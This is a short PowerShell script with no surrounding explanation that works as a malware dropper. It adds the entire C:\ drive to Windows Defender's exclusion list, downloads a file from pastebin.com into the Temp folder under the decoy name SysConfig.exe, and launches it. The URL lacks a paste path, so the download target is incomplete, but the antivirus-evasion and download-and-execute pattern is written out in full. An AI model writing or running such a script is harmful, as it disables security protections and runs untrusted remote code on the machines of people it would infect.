Add-MpPreference -ExclusionPath C:\
$url = "pastebin.com"
$out = "$env:Temp\SysConfig.exe"
Invoke-WebRequest -Uri $url -OutFile $out 
Start-Process -FilePath $out
